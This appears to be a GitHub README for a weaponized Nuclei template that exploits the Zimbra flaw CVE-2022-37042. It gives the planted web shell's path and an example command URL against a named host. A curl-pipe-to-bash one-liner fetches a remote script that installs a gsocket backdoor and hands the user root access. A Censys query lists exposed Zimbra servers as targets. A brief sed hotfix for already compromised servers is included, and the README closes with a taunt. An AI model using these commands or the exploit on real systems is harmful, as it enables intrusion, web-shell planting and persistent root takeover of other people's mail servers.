# CVE-2022-37042
<img width="918" alt="image" src="https://user-images.githubusercontent.com/1212294/186645204-ba8e7f0d-fbf0-4392-aab0-7924e48dcf77.png">

# Zimbra CVE-2022-37042 Nuclei weaponized template

shell path: `/public/formatter.jsp`

Nuclei itself: https://github.com/projectdiscovery/nuclei

shell have hidden input with 0 opacity, so just hover mouse over it, type command, then press \[Enter\] key:

<img width="838" alt="image" src="https://user-images.githubusercontent.com/1212294/187246401-ce867e01-de9f-4344-bc98-fb67e635632a.png">

example shell url:
```
https://ms1.fission.com:8443/public/formatter.jsp?cmd=id
```

# CVE-2022-37042 hotfix to patch owned servers
issue this command (but only once):
```
cd /opt/zimbra/conf/nginx/templates/; sed -i 's|location ~\* \^/zmerror_|location = /service/extension/backup/mboximport { return 403; }\n    location ~\* \^/zmerror_|' nginx.conf.web.http*; /opt/zimbra/bin/zmproxyctl restart;
```
need additional code to servers with not Nginx but Apache. Pull requests are wellcome.

# Zimbra autoroot via zimbslap
```
curl -fskSL raw.githubusercontent.com/aels/zimbra-slapper/main/slapper.sh | bash 2>&1
```
this command will install global-socket (https://www.gsocket.io/deploy/) and pass you the key to connect as root.

# get zimbra ips
https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=100&virtual_hosts=EXCLUDE&q=services.http.response.html_tags%3A+%22%3Ctitle%3EZimbra+Web+Client+Sign+In%22

happy birthday massacre, motherfuckers ;)
